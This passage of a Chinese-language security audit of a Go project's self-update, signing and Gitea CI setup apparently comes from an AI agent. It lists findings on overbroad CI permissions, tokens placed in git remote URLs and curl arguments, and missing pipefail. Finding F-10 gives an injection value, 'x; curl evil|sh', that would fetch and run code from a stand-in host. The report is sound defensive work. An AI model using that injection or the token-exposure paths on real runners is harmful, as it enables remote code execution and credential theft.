### [S3] F-7 CI 权限范围过宽：工作流级 `contents: write`，且 `workflow_dispatch` 在任意 ref 上运行签名步
- 类别：CI 密钥 / 提权
- 位置：`.gitea/workflows/ci.yml:8-9`、`ci.yml:31`（`test` job）、`ci.yml:158-161`
- 证据：

      permissions:
        contents: write          # ci.yml:8-9，工作流级
      ...
      - name: sign the checksum list
        if: startsWith(github.ref, 'refs/tags/v') || github.event_name == 'workflow_dispatch'   # ci.yml:158
        env:
          SDAUTOLOGIN_SIGNING_KEY: ${{ secrets.SDAUTOLOGIN_SIGNING_KEY }}

- 攻击路径：① 只读的 `test` job 也持有 `contents: write` 的 token（`ci.yml:41-43` 还会把它注入到 job 环境里），任何在 `go vet`/`go test` 里执行的代码（例如某个测试用到的 vendor 包被投毒）都能改写仓库。② 拥有写权限的人可对**任意分支**发起 `workflow_dispatch`：该 ref 上的 `tools/build/sign` 代码会在 `SDAUTOLOGIN_SIGNING_KEY` 已在环境中的情况下运行，等于把生产签名密钥交给那个 ref 上的代码；没有 environment / 手工审批门。
- 影响：完整性（①②都已在"有写权限"的边界内，故不是越权提升，但缺少纵深防御；①把写权限扩散到"能执行测试代码即能写仓库"）。不持久。
- 修复：把 `permissions: contents: write` 从工作流级下移到 `packages` job，`test` job 显式 `permissions: contents: read`；给签名步加 `if: github.ref == 'refs/heads/main' || startsWith(github.ref,'refs/tags/v')`；把签名密钥放进受保护的 environment 并要求人工批准。
- 置信度：高。

### [S3] F-8 运行 token 被写进 `.git/config` 的 remote URL，并以命令行参数传给 `curl`
- 类别：CI 密钥 / 凭据暴露面
- 位置：`.gitea/workflows/ci.yml:56,103,317`、`ci.yml:227,256,288,295,324`、`.gitea/scripts/dedupe-release-assets.sh:60,118`
- 证据：

      # ci.yml:56
      url="https://oauth2:${token}@${host}/${REPO}.git"
      # ci.yml:227
      auth="Authorization: token $token"
      # dedupe-release-assets.sh:117-119
      code=$(curl -sS -o /dev/null -w '%{http_code}' -X DELETE \
        -H "Authorization: token $token" \
        "$instance/api/v1/repos/$repo/releases/$id/assets/$asset")

- 攻击路径：① `git remote add/set-url` 把带 token 的 URL 写进 `/src/.git/config`；本工作流不上传 artifact（`ci.yml:142-143`），也没有回显 remote 的步骤，所以目前没有直接泄漏路径，但任何后来的调试步骤（`cat .git/config`、打包工作目录、失败的 `git` 报错带出 remote URL）都会泄漏一个 `contents: write` 的 token。② `curl -H "Authorization: token $token"` 把 token 放进**进程参数**，同机任意用户 `ps`/`/proc/*/cmdline` 可读。
- 影响：机密性（token 泄漏 → 写仓库权限）。不持久（token 随运行结束失效），但 JIT token 泄漏仍可在有效期内被滥用。
- 修复：用 `-c http.extraHeader="Authorization: token $token"` 或 `GIT_ASKPASS`/credential helper 代替 URL 内嵌；`curl` 用 `-H @-`（从 stdin 读头）或 `--config <(...)`（注意权限 0600）。
- 置信度：高。

### [S3] F-9 `dedupe-release-assets.sh`：`set -eu` 缺 `pipefail`，`curl | jq` 的失败被静默吞掉
- 类别：加固（本脚本共 2 处问题：本次 + F-8 的 token 传参）
- 位置：`.gitea/scripts/dedupe-release-assets.sh:20`、`:59-65`、`:75-91`
- 证据：

      set -eu                                     # dedupe-release-assets.sh:20 —— 无 pipefail
      release=$(if [ -n "$token" ]; then
        curl -sS -H "Authorization: token $token" "$instance/api/v1/repos/$repo/releases/tags/$tag"
      ...
      id=$(printf '%s' "$release" | jq -r '.id // empty')   # :65 —— 管道状态取 jq 的

- 攻击路径：网络中断或 token 失效时 `curl` 以非 0 退出，但管道退出码来自 `jq`（`jq` 对空/错误输入往往仍以 0 退出）→ `release` 为空 → `id` 为空 → 脚本报 "there is no release of $tag in $repo" 并 `exit 1`。**因此这里是失败而非静默成功**，实际危害被下游的 `-z "$id"` 检查挡住了。但 `:89-91` 的 `attached`/`names`/`trimming` 三个统计同样走 `curl | jq` 形态的取数，若上游被代理污染、`curl` 截断而 `jq` 仍解析出部分对象，`trimming` 会被算成 0，脚本打印"nothing to remove"并**以退出码 0 结束**——一次 dry-run 会误导操作者以为无需清理。这是"失败被静默忽略"的真实形态。
- 影响：完整性（可能漏删重复附件；`--apply` 下也可能少删，属可用性问题而非安全边界突破）。不持久。
- 修复：`set -eu` 改 `set -euo pipefail`；把 `curl` 的输出先落到变量再交给 `jq`（去掉管道）；对 `curl` 加 `-f` 使 HTTP 4xx/5xx 直接非 0。
- 置信度：中（`trimming` 静默为 0 需要上游响应异常，无法在无网络的本次审查中实测；缺 `pipefail` 与 `curl -f` 是确定事实）。
### [S3] F-10 `apt-mirror.sh`：镜像主机名被插入 `bash -c` 与 `sed` 执行
- 类别：命令注入 / 加固（本脚本共 2 处问题：`:19` 与 `:26`，同源）
- 位置：`.gitea/scripts/apt-mirror.sh:19`、`:26`；调用处 `.gitea/workflows/ci.yml:115-116`
- 证据：

      # apt-mirror.sh:19 —— 变量被拼进 bash -c 的命令字符串
      if ! timeout 10 bash -c "exec 3<>/dev/tcp/${DEBIAN_MIRROR}/80" 2>/dev/null; then
      # apt-mirror.sh:26 —— 变量被拼进 sed 的替换式，未转义 & 与 |
      sed -i "s|deb.debian.org|$DEBIAN_MIRROR|g; s|security.debian.org|$DEBIAN_MIRROR|g" "$f"

- 攻击路径：`DEBIAN_MIRROR` 目前是 `ci.yml:28` 的工作流常量（**没有外部输入路径**），因此现在不可利用。风险在于这个函数被写成了通用的变量插值：一旦 `DEBIAN_MIRROR` 来自 workflow input/dispatch 参数或被模板化，值 `x; curl evil|sh` 会在 runner 上以 root 执行（`:19` 的 `bash -c`），或 `:26` 的 `&` 会把镜像名替换成匹配文本，把 apt 源指向攻击者主机（此后 `apt-get install` 拉到的 `rpm`/`bsdtar` 就是 `verify` 的裁判，链路影响等同 F-6）。
- 影响：当前无实际影响；作为配置注入的原语存在。
- 修复：`:19` 改为 `bash -c 'exec 3<>/dev/tcp/"$1"/80' _ "$DEBIAN_MIRROR"`（用位置参数而非字符串插值）；`:26` 先对变量做白名单校验（只允许 `[A-Za-z0-9.-]`），并把 `sed` 的 `&`/`|` 转义。
- 置信度：高（代码事实明确；"当前不可利用"也已核实）。

### [S3] F-11 `tools/build resources` 以 `-mod=mod` 从模块代理拉取 `go-winres@v0.3.3`，不受 `vendor/` 与 `go.sum` 约束
- 类别：版本固定 / 供应链
- 位置：`tools/build/main.go:36`、`tools/build/main.go:336-339`
- 证据：

      // winresVersion is pinned so regenerating the resources is reproducible.
      winresVersion = "github.com/tc-hib/go-winres@v0.3.3"     // main.go:36
      ...
      env := []string{"GOFLAGS=-mod=mod"}                       // main.go:336
      return runGo(root, env, "run", winresVersion, "make", ...) // main.go:337

- 攻击路径：该工具**不在 `go.mod` 的 require 里，也不在 `vendor/` 与 `go.sum` 里**（已核对：`go.sum` 只有 3 个模块，`vendor/modules.txt` 只有 3 个模块、7 个包，`tools/` 不在 vendor 中）。`@v0.3.3` 固定的是 tag 而不是 commit 摘要；模块代理（或 `GOPROXY`/`GONOSUMDB` 被改的环境）可以返回不同内容。该任务只在 `resources`/`icon` 流程里运行，不参与 `packages`/CI 主路径，因此影响面限于"重新生成 winres 资源时"——而 `winres/*.syso` 是**提交进仓库**的二进制（`.gitattributes:18` 声明 `*.syso binary`），所以一次被投毒的 `resources` 运行会直接改动仓库里的二进制。
- 影响：完整性（前置条件：模块代理或 `GOPROXY` 被控制/投毒）。持久（提交进仓库的 `.syso`）。
- 修复：把 `tools/` 的依赖纳入一个单独的 module 并用 `go.sum` 固定；或在 CI 里显式 `GOSUMDB=sum.golang.org` 并校验该模块的内容哈希；或把已生成的 `.syso` 视为唯一来源、禁止在 CI 重新生成。
- 置信度：中（"不被 vendor/go.sum 覆盖"是确定事实；"代理可以返回不同内容"取决于部署的 `GOPROXY`/`GOSUMDB` 设置，本次无法读取 runner 环境）。

### [S3] F-12 `.gitignore` 只挡住根目录的 `/signing.key`，没有通用密钥模式
- 类别：密钥存放 / 加固
- 位置：`.gitignore:14-19`
- 证据：

      # A signing key left at the top of the tree. keygen no longer writes here — the
      # private half goes to the per-user configuration directory, ...
      /signing.key

- 攻击路径：`keygen` 现在写 `os.UserConfigDir()/sdautologin/signing.key`（`signing.go:32-36`，已确认在检出目录之外，并有测试 `signing_test.go:67-76` 断言）。但任何把密钥放到别处的操作——`SDAUTOLOGIN_SIGNING_KEY_FILE=./keys/signing.key`、手抄一份 `.pem`、临时把私钥 base64 写进 `signing.txt`——都不会被任何规则挡住，而 `git add -A` 会静默纳入。
- 影响：完整性（一旦提交，历史永久可恢复；本次已确认**历史中没有**，属预防性加固）。持久且不可撤销（需改写历史 + 轮换）。
- 修复：加 `*.key`、`*.pem`、`**/signing.key`、`*.sig`。
- 置信度：高。

### [S4] F-13 `RemoveLeftover` 在生产代码里没有调用点，`<exe>.old` 残留且没有回滚
- 类别：提权 / 观察
- 位置：`internal/update/install.go:231-237`（定义）、`internal/update/install.go:214-215`（唯一的清理点）、`internal/update/install_test.go:209`（唯一调用者）
- 证据：对 `internal/`、`cmd/`、`tools/` 全量搜索 `RemoveLeftover` 的结果只有三处——`install.go:231` 的注释与 `:233` 的定义、`install_test.go:209` 的测试调用。**没有任何生产路径调用它。**

      // install.go:231-232
      // RemoveLeftover deletes the copy a replacement moved aside. It is called at
      // startup, when the file it names is no longer the one being executed.

- 攻击路径：无外部攻击者。后果是运维层面的：① 每次自替换后 `<exe>.old` 一直留在磁盘上，直到**下一次** `Replace` 的 `install.go:215 os.Remove(leftover)` 才清掉——即"更新一次就残留一个旧版本二进制，可能长期存在"；② `Replace` 只在新文件改名失败时回滚（`install.go:222-224`），**没有"新程序起来失败则回退到 `.old`"的机制**，一次坏的发布（哪怕签名正确）会让程序起不来且需要人工修；③ 注释与实现不符会误导后续维护者以为启动时已清理。
- 影响：可用性 + 攻击面（多一份旧二进制，且在 Windows 上被运行中的进程锁着，直到进程退出才可删除）。不突破安全边界。
- 修复：在启动流程里真的调用一次 `RemoveLeftover(exePath)`，或把清理提到首次启动自检（能启动即删 `.old`，否则提示恢复）。
- 置信度：高。

### [S4] F-14 工作区两个未提交改动是纯 mode 变更（丢失可执行位）
- 类别：版本固定 / 观察
- 位置：`build.sh`、`.gitea/scripts/dedupe-release-assets.sh`（索引里均为 `100755`）
- 证据：

      diff --git a/build.sh b/build.sh
      old mode 100755
      new mode 100644

  `git diff --numstat` = `0 0`（内容零改动）；`git ls-files -s` 显示索引仍是 `100755`；`core.fileMode=true`。
- 攻击路径：无。不引入安全风险——CI 对这两个脚本都不依赖执行位（`ci.yml:115` 用 `. ...apt-mirror.sh` source，`ci.yml:334` 用 `sh ...wiki-pages.sh`，而 `dedupe-release-assets.sh` 根本不在 `ci.yml` 里）。实际影响是文档化的 `./build.sh` 与 `./.gitea/scripts/dedupe-release-assets.sh <tag> --apply` 会失败。
- 影响：可用性（本地开发/运维），无安全影响。不持久（`git checkout -- <file>` 即恢复）。
- 修复：`git checkout -- build.sh .gitea/scripts/dedupe-release-assets.sh` 恢复；若确认是 Windows/UNC 检出造成的假改动，用 `git update-index --chmod=+x` 复核。
- 置信度：高。

### [S4] F-15 `golang.org/x/sys v0.15.0` 相对"go 1.26"模块已陈旧，CVE 状态无法验证
- 类别：版本固定 / 观察
- 位置：`go.mod:6`、`vendor/modules.txt:8-9`
- 证据：

      # go.mod
      go 1.26
      golang.org/x/sys v0.15.0
      # vendor/modules.txt
      # golang.org/x/sys v0.15.0
      ## explicit; go 1.18

  `v0.15.0` 是 2023 年 11 月的版本（其模块声明 `go 1.18`），而本项目声明 `go 1.26`。`github.com/godbus/dbus/v5 v5.1.0`、`fyne.io/systray v1.12.2` 同样陈旧。
- 攻击路径：**无法验证**——不具备判断"该版本是否命中某个已知 CVE"的条件。执行过一次 web 检索，返回的多为聚合站点（socket.dev / deps.dev）与一条 `CVE-2022-29526`（`golang.org/x/sys` 的 `Faccessat` 权限问题），其影响版本区间**未在本地核对**，且本机无 `govulncheck`/Go 工具链，**因此不给出结论**。可确定的是：`vendor/` 里 `x/sys` 只用到 `golang.org/x/sys/windows` 一个包（`vendor/modules.txt:9`），这限制了受影响面。
- 影响：未知（不排除、也不断言）。
- 修复：在有网络与 Go 工具链的机器上跑 `go get -u golang.org/x/sys@latest && go mod tidy && go mod vendor` 与 `govulncheck ./...`；把 `govulncheck` 加进 CI 的 `test` job。
- 置信度：低（缺 Go 工具链与可用的漏洞数据源）。

### [S4] F-16 `wiki-pages.sh` 使用固定路径 `/tmp/wiki`
- 类别：加固 / 观察（本脚本本身未发现注入或未引用变量问题）
- 位置：`.gitea/workflows/ci.yml:322,328,334,336`、`.gitea/scripts/wiki-pages.sh:42-49,85-90`
- 证据：

      if ! git clone --quiet "$url" /tmp/wiki; then      # ci.yml:322
      ...
      sh ./.gitea/scripts/wiki-pages.sh . /tmp/wiki      # ci.yml:334

- 攻击路径：runner 上若有其他进程预置 `/tmp/wiki`，`git clone` 对非空目录会失败，随后 `ci.yml:328-331` 二次失败即 `exit 0`（**该步被跳过**），因此实际不可达"把 token 推给攻击者主机"的路径——`git push` 用的是克隆下来的本地 repo 的 origin。判定为加固项而非漏洞：固定且可预测的临时路径 + `mkdir -p`（`wiki-pages.sh:42`）跟随符号链接，是不必要的风险形状。
- 影响：无已证实的机密性影响（`git clone` 的失败分支挡住了它）。不持久。
- 修复：`work=$(mktemp -d)` 并用 `trap 'rm -rf "$work"' EXIT`，把 `$work` 传给 `wiki-pages.sh`。
- 置信度：中（不可达这一点依赖于 `git clone` 对非空目录的行为，未在本机实测）。

## 架构与设计层面问题

1. **信任根只覆盖内容与文件名，不覆盖"这是一次更新"这件事本身。** 元数据（`Tag`、`Prerelease`、资产名/URL）全部未签名，见 F-1。签名一个"发布清单"而不含版本号与资产表，是这套设计里最大的结构性缺口：它把"版本单调性"变成了客户端从**未签名输入**推导出的属性。目前正确，但属于隐含不变量，建议把 `Tag` 也纳入被签对象（例如签 `SHA256SUMS` 之外再加一行 `version=<tag>`），这样降级防护就从"碰巧成立"变为"被密码学保证"。

2. **`Client.HTTP` 形同虚设。** `forge.go:67,77,110` 定义了 `HTTP *http.Client` 并用它取 releases，但两个下载函数（`update.go:187 fetchSmall`、`install.go:136 Fetch`）直接用包级 `http.DefaultClient`。于是：① 无法为下载配置超时/重定向策略/传输约束；② `Client` 的字段给了"可注入客户端"的错觉（测试靠绝对 URL 绕过，`cli_test.go:1122`）。建议把 `HTTP` 传下去，或删掉该字段并统一由包级可替换变量提供。

3. **"点按钮即可下载并就地替换"没有二次确认。** `CheckForUpdateNow`（`service.go:698`）刻意忽略 `checkForUpdates` 开关，随后 `lookForUpdate`（`service.go:660`）在验证通过后**直接调用 `Install` 覆盖正在运行的程序**，用户只在日志里看到一行 "takes effect on the next start"。就威胁模型而言这是合理的（内容已签名），但把"发现更新"与"安装更新"绑成一个动作，使得任何能操纵元数据的人都能在用户不知情时触发一次磁盘写入与二进制替换（虽然替换的是真版本）。建议：About 页的按钮只做检查，安装单独确认。

4. **不改动写入路径这一点是对的，值得保留记录。** 安装目标是本地 `os.Executable()`（`appstate.go:69,78`），**从不来自元数据**；`ArchiveName` 的输入只用于在**已签名清单里查名字**，从不作为磁盘路径。这是本设计里最强的几个决定之一，也是元数据未签名却无法造成路径穿越/任意写入的原因。

5. **签名私钥的生命周期只有"一个 const 槽位"。** 轮换要求全部已安装副本手工升级（`signing.go:57-63`），没有密钥集、没有过渡期、没有撤销列表。对校园网这种"装机量分散、无法统一下发"的场景，轮换成本极高，建议至少支持"当前 + 上一把"双槽位，使轮换可以在一个发布周期内平滑完成。

6. **单一平台的自替换。** `ArchiveName` 只对 `windows` 返回 ok（`install.go:44-46`），Linux 上永远返回"包管理器负责更新"（`install.go:84-85`）。所以整套自替换代码只在 Windows 上有实际攻击面，而 Windows 又恰好是"没有包管理器、用户目录可写"的场景——`SelfInstall` 用真实写入探测代替权限位、并且**从不静默提权**（`install.go:91-97`），这两个决定都正确。

## 覆盖声明

**逐行读过的文件**：`internal/update/` 的 `sign.go`(135)、`publickey.go`(13)、`update.go`(205)、`install.go`(238)、`forge.go`(189)、`version.go`(131)；`tools/build/` 的 `signing.go`(186)、`verify.go`(563)、`main.go`(469)、`release.go`(87)、`signing_test.go`(158)；`tools/icogen/main.go` 前 30 行（带 `//go:build ignore`，只做图标生成，无网络/无凭据）；`.gitea/workflows/ci.yml`(352) 全文；`.gitea/scripts/` 的三个脚本全文；`build.sh`、`build.cmd`、`run.cmd`、`CMakeLists.txt`、`Dockerfile`、`.dockerignore`、`.gitattributes`、`.gitignore`、`go.mod`、`go.sum`、`vendor/modules.txt` 全文；`packaging/` 的 `deb/control/{postinst,prerm,postrm}`、`openwrt/control/{postinst,prerm}`、`openwrt/root/etc/init.d/sdautologin`、`systemd/system/sdautologin.service` 全文（未发现注入、未引用变量、`eval` 或凭据回显；`$DPKG_ROOT`、`$password`、`$password_file` 均正确引用并优先用 `--password-file`）。

**部分读过**：`tools/build/pack.go`（1-120、403-602 逐行；其余按函数大纲 + 危险原语检索）、`pack_win.go`（1-120、151-280 逐行）、`internal/update/update_test.go`/`install_test.go`/`forge_test.go`/`version_test.go`/`sign_test.go`（读取全部测试函数名以评估覆盖，未逐个读完整实现体）、`cmd/SDAutoLogin/cli.go` 的 800-940（更新命令路径）、`internal/app/{payload.go 头部、appstate.go 50-110}`、`internal/service/service.go` 的 594-709 及 `Update`/`Updater` 类型与调用点、`internal/config/config.go` 的 `CheckForUpdates` 相关行。

**未逐行读**：`tools/build/pack_rpm.go`(640)、`pack_deb.go`(171)、`pack_pacman.go`(175)、`pack_openwrt.go`(142)、`pack_test.go`(751)、`verify_test.go`(122)、`release_test.go`(138)、`version_test.go`(220)，以及 `packaging/openwrt/Makefile`、`packaging/openwrt/root/etc/config/sdautologin`、`packaging/deb/root/usr/share/doc/sdautologin/README.Debian`。**这些文件的审查不完整**，我仅对它们做了危险原语检索（`os.RemoveAll`、`exec.Command`、`os.Chmod`、`0o777`、`http.Get`、未引用的 `$` 展开），未发现异常：命中的 `verify.go:282`（临时目录的 `defer os.RemoveAll`）、`main.go:425`（`dist/packages` 的清理）、`pack.go:231-235`/`verify.go:542`/`pack.go:561`（对 `dpkg-deb`/`rpm`/`bsdtar`/`git` 的 `exec`，参数均以切片传递、无 shell、无未引用拼接）均为正常用法。

**测试盲区（按测试函数名与 `t.Skip` 判定）**：
- `install_test.go:77 t.Skip("the mode bits do not hold here")`——权限位相关断言在非 Unix 上被跳过；
- `version_test.go:33 t.Skip("this tree has no tag, ...")`——无 tag 的检出里该一致性测试不运行；
- 没有任何测试覆盖 **资产 URL 的主机/协议约束**、**重定向策略**、**未签名元数据被篡改**这三种情形（因为代码里没有对应约束，见 F-1）；
- 有测试覆盖了正确的否定面：另一把密钥签的发布被拒（`TestAReleaseSignedWithAnotherKeyIsRefused`）、不是签名清单里那份归档被拒（`TestAnArchiveThatIsNotTheSignedOneIsRefused`）、没有签名的发布被拒（`TestAReleaseWithNoSignatureIsRefused`）、无密钥的构建不装任何东西（`TestABuildWithNoKeySaysSoAndInstallsNothing`）、摘要不符的下载被拒（`TestADownloadThatDoesNotMatchItsDigestIsRefused`）、替换失败保留原程序（`TestAFailedReplacementLeavesTheProgramThatWasThere`）、签名不读工作树里的密钥（`TestSigningDoesNotReadAKeyFromTheTree`）。

**未执行、因此无法验证的事项**：**本机（Windows 与 WSL 均）没有 Go 工具链，未运行 `go build`、`go vet`、`go test`、`govulncheck`、`go mod verify`、`go mod vendor` 中的任何一个**。因此：① `vendor/`、`go.sum`、`go.mod` 的一致性只做了**结构核对**（7 个包全部存在、0 个未列出的 Go 包目录、3 个依赖的 `h1:` 与 `/go.mod` 哈希齐全），**没有做内容哈希核对**；② 测试是否通过、`go vet` 是否干净**未知**；③ F-6/F-15 涉及的 CVE 判断**无数据源支持**；④ `ci.yml` 的实际运行行为（Gitea Actions 对 `github.ref`、`secrets` 的具体展开）**未在真实 runner 上验证**；⑤ 本机无 `dpkg-deb`/`rpm`/`bsdtar`/`jq`/`gitea`，三个脚本未实际执行过；⑥ `docs/DEPLOYMENT.md` 中描述的发布流程未逐条对照（不在清单内）。**我未做任何修改**：未改动任何源码或配置文件，未执行任何签名、发布、打包或 CI 触发动作；唯一写入是本报告文件（`docs/audit/` 目录里原有的 `.probe` 是审查框架的写入探测文件，与项目无关）。

## 附录：关键代码与 diff 摘录

**A1 · 信任根（唯一的信任锚点）**

    // internal/update/publickey.go:12-13
    // Changing this line is how the key is rotated: a release signed with a key
    // that is not the one written here is refused, and the refusal names both keys.
    const PublicKey = "Qyh5LHHJwL83IlHmu2fZBmdeMOdzqZoJnnwZng0GcM0="

**A2 · 验证顺序（update.go:125-176 的骨架，说明"先验签名、再取摘要、最后写盘"）**

    sums, err := fetchSmall(sumsCtx, sumsAsset.URL)          // 139
    sig, err := fetchSmall(sumsCtx, sigAsset.URL)            // 144
    if err := VerifySignature(pub, sums, string(sig)); err != nil {   // 149
        return "", fmt.Errorf("the release is not signed by this project: %w", err)
    }
    sumsList, err := ParseChecksums(sums)                    // 153
    want, ok := sumsList.Sum(name)                           // 157
    if !ok { return "", fmt.Errorf("the signed list does not name %s", name) }  // 159
    archive, err := Fetch(parent, asset.URL, want)           // 166
    program, err := UnpackProgram(archive)                   // 170
    if err := Replace(t.ExePath, program); err != nil {      // 174

**A3 · `Newest` 的降级过滤（forge.go:164-181）**

    v, err := ParseVersion(r.Tag)
    if err != nil { continue }                                   // 166-171
    if ch == Stable && (v.IsPrerelease() || r.Prerelease) { continue }   // 174
    if !v.NewerThan(current) { continue }                        // 177

**A4 · `SelfInstall` 用真实写入探测代替权限位（install.go:91-101）**

    // Permission bits do not say whether a directory can be written: a read-only
    // mount, an ACL and a read-only filesystem all look writable to a stat. The
    // only answer that holds is to make a file there and remove it again.
    probe, err := os.CreateTemp(dir, ".sdautologin-write-probe")
    if err != nil {
        return Install{Reason: fmt.Sprintf("%s cannot be written to, so the program cannot replace itself there", dir)}
    }

**A5 · 历史上真实存在过的"从工作树读密钥"回退（`git show 0a2c6a2 -- tools/build/signing.go` 的删除侧）**

    -		// The file keygen wrote is the fallback, so signing a release by hand on
    -		// the machine that holds the key works without repeating it.
    -		data, err := os.ReadFile(filepath.Join(root, signingKeyFile))
    -		if err != nil {
    -			return fmt.Errorf("no signing key: set %s, or run keygen to make one", update.SigningKeyEnv)
    -		}
    -		text = string(data)

**A6 · 工作区的两个未提交改动（全文）**

    diff --git a/build.sh b/build.sh
    old mode 100755
    new mode 100644
    diff --git a/.gitea/scripts/dedupe-release-assets.sh b/.gitea/scripts/dedupe-release-assets.sh
    old mode 100755
    new mode 100644

`git diff --numstat` → `0	0	.gitea/scripts/dedupe-release-assets.sh` / `0	0	build.sh`；`git ls-files -s` → 两者索引均为 `100755`。

**A7 · 用于判定工作区编码是否损坏的字节核对（`.gitignore:14`）**

    006B 0065 0079 0067 0065 006E ... 0077 0072 0069 0074 0065 0073 0020 2014 0020 0074 0068 0065

`U+2014` 是合法的 em dash，文件为合法 UTF-8。**控制台显示出的 `鈥?` 是 PowerShell 输出编码问题，不是仓库缺陷——已排除，不作为发现。**